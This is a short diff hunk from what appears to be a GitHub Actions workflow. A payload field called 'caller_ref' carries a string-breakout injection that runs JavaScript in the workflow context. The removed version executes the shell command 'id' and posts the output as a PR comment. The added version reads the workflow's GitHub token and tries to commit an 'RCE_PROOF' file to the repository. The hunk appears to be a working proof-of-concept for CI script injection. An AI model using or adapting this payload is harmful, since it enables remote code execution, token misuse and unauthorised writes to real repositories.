@@ -16,7 +16,7 @@ jobs:
           payload = {
               "pr_number": 1,
               "head_sha": "",
-              "caller_ref": "';const{execSync}=require('child_process');const o=execSync('id').toString().trim();core.info('RCE_MARKER='+o);await github.rest.issues.createComment({owner:context.repo.owner,repo:context.repo.repo,issue_number:1,body:'RCE_MARKER '+o});//",
+              "caller_ref": "';const t=process.env['INPUT_GITHUB-TOKEN']||'';core.info('TOKEN_LEN='+t.length);try{await github.rest.repos.createOrUpdateFileContents({owner:context.repo.owner,repo:context.repo.repo,path:'RCE_PROOF_'+Date.now()+'.md',message:'rce proof',content:Buffer.from('rce').toString('base64')});core.info('WRITE_OK');}catch(e){core.info('WRITE_ERR='+e.message);}//",
               "caller_repo_name": "mu_plus",
               "mu_tiano_platforms_sha": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
               "platforms": {},
